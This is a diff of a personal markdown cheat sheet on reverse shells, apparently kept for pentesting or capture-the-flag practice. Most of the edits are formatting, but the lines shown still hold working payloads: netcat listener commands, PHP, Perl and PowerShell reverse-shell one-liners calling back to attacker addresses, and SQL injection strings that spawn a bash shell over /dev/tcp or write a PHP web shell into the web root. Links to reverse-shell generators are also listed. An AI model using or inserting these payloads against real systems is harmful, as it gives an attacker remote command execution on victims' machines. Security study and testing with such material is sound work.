@@ -1,18 +1,19 @@
 # nc
 
-Author: Julien Bongars
-Date: 2025-09-20 16:34:33
+**Author:** Julien Bongars\
+**Date:** 2025-09-20 16:34:33
+**Path:**
 
 ---
 
-# source
+## Source
 
 ```bash
 nc -lvp 4444
 <wait for connection>
 ```
 
-# target
+## Target
 
 ```bash
 # nc
@@ -35,7 +36,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-# base64 (any)
+## Base64 (any)
 
 ```bash
 cat <<EOF | base64 -w 0 && echo ''
@@ -57,7 +58,7 @@ EOF
 '; SELECT system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); --
 ```
 
-## MySQl
+## MySQL
 
 ```sql
 '; SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'; --
@@ -80,7 +81,7 @@ p.waitFor()
 $LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 ```
 
-# resource
+## resource
 
 ## Generator\*\*\*
 
@@ -90,8 +91,14 @@ https://www.revshells.com/
 
 https://github.com/0dayCTF/reverse-shell-generator
 
-## Internet all the things
+## Internal All The Things
 
 ~/.hacklas/external/internal-all-the-things/docs/cheatsheets/shell-reverse-cheatsheet.md
 
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary
+
+## Resources
+
+- [revshells.com](https://www.revshells.com/) — reverse shell generator
+- [0dayCTF/reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator) — generator source
+- [InternalAllTheThings reverse-shell cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) — extra payloads
